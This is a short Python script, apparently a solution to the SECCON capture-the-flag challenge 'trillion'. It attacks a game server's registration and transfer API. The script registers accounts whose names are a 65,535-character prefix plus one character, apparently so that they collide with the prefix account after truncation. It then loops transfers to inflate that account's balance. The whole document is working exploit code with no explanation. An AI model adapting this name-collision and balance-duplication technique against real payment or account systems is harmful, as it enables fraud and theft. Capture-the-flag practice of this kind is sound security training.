import random
import requests

s1 = requests.Session()
s2 = requests.Session()
s3 = requests.Session()

host = 'http://trillion.seccon.games:3000'


def _(x):
    print(x.text)
    x.raise_for_status()
    return x.json()


prefix = ''.join(random.sample('abcdefghijklmnopqrstuvwxyz', 5)).ljust(0x10000 - 1, 'a')
_(s3.post(f'{host}/api/register', json={"name": prefix}))
_(s1.post(f'{host}/api/register', json={"name": prefix + 'a'}))
_(s2.post(f'{host}/api/register', json={"name": prefix + 'b'}))

while True:
    b = _(s1.get(f'{host}/api/me'))['balance']
    _(s1.post(f'{host}/api/transfer', json={"recipientName": prefix, "amount": b}))
    b = _(s2.get(f'{host}/api/me'))['balance']
    _(s2.post(f'{host}/api/transfer', json={"recipientName": prefix, "amount": b}))
